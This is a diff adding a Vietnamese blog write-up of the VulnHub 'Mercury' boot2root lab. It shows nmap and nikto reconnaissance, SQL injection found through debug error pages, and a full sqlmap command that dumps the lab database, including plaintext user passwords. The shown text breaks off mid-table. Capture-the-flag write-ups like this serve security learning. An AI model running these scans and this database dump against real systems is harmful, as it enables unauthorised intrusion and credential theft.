@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <meta name="google-site-verification" content="Txr_ZAJ6seUhm2Y9s8eRpRy2qOSdUO9A_9jfLLn_bPw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"guyintheclouds.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="OverviewLink download: THE PLANETS: MERCURYDifficulty: EasyĐây là một machine trên Vulnhub, theo dạng boot2root, yêu cầu của bài là phải lấy được 2 flag trong user.txt và root.txt.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[VulnHub] Mercury">
+<meta property="og:url" content="https://guyintheclouds.com/2020/12/25/mercury-vulnhub/index.html">
+<meta property="og:site_name" content="Guy_in_the_clouds">
+<meta property="og:description" content="OverviewLink download: THE PLANETS: MERCURYDifficulty: EasyĐây là một machine trên Vulnhub, theo dạng boot2root, yêu cầu của bài là phải lấy được 2 flag trong user.txt và root.txt.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://guyintheclouds.com/banner/mercury-vulnhub.png">
+<meta property="og:image" content="https://guyintheclouds.com/2020/12/25/mercury-vulnhub/pic1.png">
+<meta property="og:image" content="https://guyintheclouds.com/2020/12/25/mercury-vulnhub/pic2.png">
+<meta property="og:image" content="https://guyintheclouds.com/2020/12/25/mercury-vulnhub/pic3.png">
+<meta property="article:published_time" content="2020-12-25T17:49:06.000Z">
+<meta property="article:modified_time" content="2025-06-14T14:58:22.604Z">
+<meta property="article:author" content="minhnq22">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="write up">
+<meta property="article:tag" content="easy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guyintheclouds.com/banner/mercury-vulnhub.png">
+
+
+<link rel="canonical" href="https://guyintheclouds.com/2020/12/25/mercury-vulnhub/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://guyintheclouds.com/2020/12/25/mercury-vulnhub/","path":"2020/12/25/mercury-vulnhub/","title":"[VulnHub] Mercury"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[VulnHub] Mercury | Guy_in_the_clouds</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-app-compat.js" integrity="sha256-k2eD8Bl04gp35v4S01cNbO+3UeLK6mVqpOyUJz4aXzY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-firestore-compat.js" integrity="sha256-r1EpenNle+MZs+KB73PFJnrmIF3k29t5XGrSqfZ9PPw=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="firestore" type="application/json">{"enable":true,"collection":"articles","apiKey":"AIzaSyDP3hkyO3EkkJ4jY-xQFQ7J2HKYiNu6ay0","projectId":"guyintheclouds-a8920"}</script>
+  <script src="/js/third-party/statistics/firestore.js" defer></script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Guy_in_the_clouds</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"># cat knowledge >> /dev/brain 2> /proc/mind</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Information-Gathering"><span class="nav-number">2.</span> <span class="nav-text">Information Gathering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">2.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nikto"><span class="nav-number">2.2.</span> <span class="nav-text">Nikto</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sqlmap"><span class="nav-number">2.3.</span> <span class="nav-text">Sqlmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Get-User-Flag"><span class="nav-number">2.4.</span> <span class="nav-text">Get User Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privileges-Escalation"><span class="nav-number">3.</span> <span class="nav-text">Privileges Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Get-Root-Flag"><span class="nav-number">3.1.</span> <span class="nav-text">Get Root Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Further-reading"><span class="nav-number">4.</span> <span class="nav-text">Further reading</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="minhnq22"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">minhnq22</p>
+  <div class="site-description" itemprop="description"><i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.linkedin.com/in/minhnq22" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-linkedin fa-fw"></i>Linkedin</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.topcv.vn/xem-cv/BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" title="CV → https:&#x2F;&#x2F;www.topcv.vn&#x2F;xem-cv&#x2F;BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" rel="noopener me" target="_blank"><i class="fa fa-bed fa-fw"></i>CV</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://guyintheclouds.com/2020/12/25/mercury-vulnhub/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="minhnq22">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guy_in_the_clouds">
+      <meta itemprop="description" content="<i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[VulnHub] Mercury | Guy_in_the_clouds">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [VulnHub] Mercury
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-12-26 00:49:06" itemprop="dateCreated datePublished" datetime="2020-12-26T00:49:06+07:00">2020-12-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/VulnHub/" itemprop="url" rel="index"><span itemprop="name">VulnHub</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="firestore-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>13 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="/banner/mercury-vulnhub.png"></p>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/the-planets-mercury,544/">THE PLANETS: MERCURY</a><br>Difficulty: Easy<br>Đây là một machine trên Vulnhub, theo dạng boot2root, yêu cầu của bài là phải lấy được 2 flag trong user.txt và root.txt.</p>
+<span id="more"></span>
+<p>Okay, xem có gì ở đây nào.</p>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>Go! Xem cái của nợ này đang có địa chỉ IP là gì.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ nmap 10.10.10.0/24                                                                             </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 21:16 +07</span><br><span class="line">Nmap scan report for 10.10.10.1</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line">All 1000 scanned ports on 10.10.10.1 are closed</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.10.10</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line"></span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 2.85 seconds</span><br></pre></td></tr></table></figure>
+<p>Tóm được machine đang có IP là 10.10.10.10, IP đẹp phết đấy ml &#x3D;))<br>Tạm thời thấy 2 cổng đang được mở là 22-SSH và 8080-HTTP. Để chắc chắn hơn thì cứ quét lại với tham số <code>-p-</code> để kiểm tra tất cả các cổng.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p- 10.10.10.10                                                                           </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 21:20 +07</span><br><span class="line">Nmap scan report for 10.10.10.10</span><br><span class="line">Host is up (0.00012s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds</span><br></pre></td></tr></table></figure>
+<p>Chả có vẹo gì thay đổi, vẫn chỉ có 2 cổng này. Tốt thôi, giờ thì xem kỹ hơn 2 cổng này chạy dịch vụ gì, phiên bản bao nhiêu, vân vân mây mây… để đi tìm hướng tấn công.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 22,8080 -sV -sC 10.10.10.10                                                            </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 21:20 +07</span><br><span class="line">Nmap scan report for 10.10.10.10</span><br><span class="line">Host is up (0.00061s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)</span><br><span class="line">|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)</span><br><span class="line">|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)</span><br><span class="line">8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">|     HTTP/1.1 404 Not Found</span><br><span class="line">|     Date: Sat, 26 Dec 2020 14:20:56 GMT</span><br><span class="line">|     Server: WSGIServer/0.2 CPython/3.8.2</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     X-Frame-Options: DENY</span><br><span class="line">|     Content-Length: 2366</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     Referrer-Policy: same-origin</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Page not found at /nice ports,/Trinity.txt.bak&lt;/title&gt;</span><br><span class="line">|     &lt;meta name=&quot;robots&quot; content=&quot;NONE,NOARCHIVE&quot;&gt;</span><br><span class="line">|     &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">|     html * &#123; padding:0; margin:0; &#125;</span><br><span class="line">|     body * &#123; padding:10px 20px; &#125;</span><br><span class="line">|     body * * &#123; padding:0; &#125;</span><br><span class="line">|     body &#123; font:small sans-serif; background:#eee; color:#000; &#125;</span><br><span class="line">|     body&gt;div &#123; border-bottom:1px solid #ddd; &#125;</span><br><span class="line">|     font-weight:normal; margin-bottom:.4em; &#125;</span><br><span class="line">|     span &#123; font-size:60%; color:#666; font-weight:normal; &#125;</span><br><span class="line">|     table &#123; border:none; border-collapse: collapse; width:100%; &#125;</span><br><span class="line">|     vertical-align:</span><br><span class="line">|   GetRequest, HTTPOptions: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Date: Sat, 26 Dec 2020 14:20:56 GMT</span><br><span class="line">|     Server: WSGIServer/0.2 CPython/3.8.2</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     X-Frame-Options: DENY</span><br><span class="line">|     Content-Length: 69</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     Referrer-Policy: same-origin</span><br><span class="line">|     Hello. This site is currently in development please check back later.</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br><span class="line">|     &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Error response&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: WSGIServer/0.2 CPython/3.8.2</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 93.24 seconds</span><br></pre></td></tr></table></figure>
+<p>Nhận được về một đống lằng tằng nhằng, và biết thêm được cổng dịch vụ 22-SSH đang chạy là OpenSSH 8.2p1, cổng 8080 đang chạy http server WSGIServer&#x2F;0.2 CPython&#x2F;3.8.2.<br>Truy cập vào <a target="_blank" rel="noopener" href="http://10.10.10.10:8080/">http://10.10.10.10:8080</a> để xem mặt mũi cái http server của nó ra sao, nhưng đéo có gì ngoài dòng chữ <em><strong>Hello. This site is currently in development please check back later.</strong></em><br>Chả mới lạ cho lắm, mở xem mã nguồn trang (Ctrl U) cũng không nốt. Giờ thì phải tiếp tục công việc thu thập thông tin bằng cách liệt kê các thư mục&#x2F;tập tin ẩn trên web server, quét với các công cụ khác để kiếm lỗi CVE,…</p>
+<h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ nikto -h http://10.10.10.10:8080                                                               </span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          10.10.10.10</span><br><span class="line">+ Target Hostname:    10.10.10.10</span><br><span class="line">+ Target Port:        8080</span><br><span class="line">+ Start Time:         2020-12-26 21:59:58 (GMT7)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: WSGIServer/0.2 CPython/3.8.2</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)</span><br><span class="line">+ OSVDB-17113: /SilverStream: SilverStream allows directory listing</span><br><span class="line">+ Server banner has changed from &#x27;WSGIServer/0.2 CPython/3.8.2&#x27; to &#x27;WSGIServer/0.2 Python/3.8.2&#x27; which may suggest a WAF, load balancer or proxy is in place</span><br><span class="line">+ 7852 requests: 0 error(s) and 2 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-12-26 22:00:59 (GMT7) (61 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
+<p>Khấm khá hơn đấy, tìm thấy thư mục <em>&#x2F;SilverStream</em>, đếch cần biết nó nghĩa là gì, truy cập vào xem sao đã.<br><img src="/2020/12/25/mercury-vulnhub/pic1.png"><br>Ờ hớ, thư mục không tồn tại, trả về lỗi 404, nhưng do chế độ debug của web site được bật nên tôi thấy được một thư mục có tên là <em>&#x2F;mercuryfacts</em>. Mặt mũi của nó như thế này.<br><img src="/2020/12/25/mercury-vulnhub/pic2.png"><br>Và khi nhấn vào để xem Mercury Fact thì nhận được vỏn vẹn dòng <em><strong>Fact id: 1. ((‘Mercury does not have any moons or rings.’,),)</strong></em>. Ngắm nghía cái xem nào, cái này lấy <em>fact</em> theo <em>id</em> (url: <a target="_blank" rel="noopener" href="http://10.10.10.10:8080/mercuryfacts/1/">http://10.10.10.10:8080/mercuryfacts/1/</a>), vậy thì kiểm tra sql injection xem sao.<br><img src="/2020/12/25/mercury-vulnhub/pic3.png"><br>Á đù, vẫn là chế độ debug, và nó đem lại quá nhiều thông tin ngon bổ rẻ ở đây, tôi biết được url này có lỗi sql injection, biết được câu truy vấn, hệ quản trị là mysql, và cả lú thông tin cấu hình http server bên dưới nữa. Ok, ném cái url này vào <em>sqlmap</em> và lấy toàn bộ cơ sở dữ liệu ra xem.</p>
+<h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap --level=5 --risk=3 --threads=10 -u &quot;http://10.10.10.10:8080/mercuryfacts/1*/&quot; --dbms=mysql</span><br><span class="line">...</span><br><span class="line">[INFO] fetching database names</span><br><span class="line">available databases [2]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mercury</span><br><span class="line">...</span><br><span class="line">[INFO] fetching tables for database: &#x27;mercury&#x27;</span><br><span class="line">Database: mercury</span><br><span class="line">[2 tables]</span><br><span class="line">+-------+</span><br><span class="line">| facts |</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br><span class="line">...</span><br><span class="line">[INFO] fetching entries for table &#x27;users&#x27; in database &#x27;mercury&#x27;</span><br><span class="line">Database: mercury</span><br><span class="line">Table: users</span><br><span class="line">[4 entries]</span><br><span class="line">+----+-------------------------------+-----------+</span><br><span class="line">| id | password                      | username  |</span><br><span class="line">+----+-------------------------------+-----------+</span><br><span class="line">| 1  | johnny1987                    | john      |</span><br><span class="line">| 2  | lovemykids111                 | laura     |</span><br><span class="line">| 3  | lovemybeer111                 | sam       |</span><br><span 